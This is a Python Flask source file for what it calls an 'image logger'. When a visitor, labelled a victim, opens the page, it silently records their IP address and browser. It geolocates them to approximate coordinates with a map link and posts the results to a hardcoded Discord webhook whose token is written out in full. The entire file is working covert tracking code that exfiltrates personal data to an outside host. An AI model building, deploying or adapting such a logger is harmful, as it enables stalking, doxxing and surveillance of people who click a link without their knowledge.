import requests
import socket
import json
from datetime import datetime
from flask import Flask, request

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1370879641824264360/PNJjD7bPBTxzYOYg28kN4rx6CTCq_Zh01yqZS4DnbyLxnEC4t6uyOGJRN-KWnwPw7C8G'

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,isp,as,country,regionName,city,lat,lon,timezone,mobile,proxy,hosting"
        response = requests.get(url, timeout=5)
        data = response.json()
        if data['status'] == 'success':
            return data
    except:
        pass
    return {
        'isp': 'Desconhecido',
        'as': 'Desconhecido',
        'country': 'Desconhecido',
        'regionName': 'Desconhecido',
        'city': 'Desconhecido',
        'lat': '',
        'lon': '',
        'timezone': 'Desconhecido',
        'mobile': False,
        'proxy': False,
        'hosting': False
    }

def detect_os(user_agent):
    if 'Windows' in user_agent:
        return 'Windows'
    elif 'Linux' in user_agent:
        return 'Linux'
    elif 'Macintosh' in user_agent or 'Mac OS' in user_agent:
        return 'Mac OS'
    else:
        return 'Desconhecido'

def detect_browser(user_agent):
    if 'Chrome/' in user_agent:
        return f"Chrome {user_agent.split('Chrome/')[1].split(' ')[0]}"
    elif 'Firefox/' in user_agent:
        return f"Firefox {user_agent.split('Firefox/')[1]}"
    elif 'Safari/' in user_agent:
        return f"Safari {user_agent.split('Safari/')[1]}"
    else:
        return 'Desconhecido'

@app.route('/')
def log_victim():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    hora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')

    data = get_ip_info(ip)
    coords = f"{data['lat']}, {data['lon']}" if data['lat'] and data['lon'] else 'Indisponível'
    map_link = f"https://www.google.com/maps/search/?api=1&query={coords}" if coords != 'Indisponível' else 'Não disponível'

    os = detect_os(user_agent)
    browser = detect_browser(user_agent)

    embed = {
        "username": "☠️ ¡iMAGE LOGER",
        "embeds": [{
            "title": "ViTIMA INJETOR O CODE",
            "color": 0xFFFFFF,
            "description":
                f"**IP Info:**\n"
                f"> **IP:** `{ip}`\n"
                f"> **Provider:** `{data['isp']}`\n"
                f"> **ASN:** `{data['as']}`\n"
                f"> **Country:** `{data['country']}`\n"
                f"> **Region:** `{data['regionName']}`\n"
                f"> **City:** `{data['city']}`\n"
                f"> **Coords:** [{coords}]({map_link}) (Approximate)\n"
                f"> **Timezone:** `{data['timezone']}`\n"
                f"> **Mobile:** `{str(data['mobile'])}`\n"
                f"> **VPN:** `{str(data['proxy'])}`\n"
                f"> **Bot:** `{str(data['hosting'])}`\n\n"
                f"**PC Info:**\n"
                f"> **OS:** `{os}`\n"
                f"> **Browser:** `{browser}`\n\n"
                f"**User Agent:**\n```{user_agent}```",
            "footer": {"text": f"Hora: {hora}"}
        }]
    }

    requests.post(WEBHOOK_URL, json=embed)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
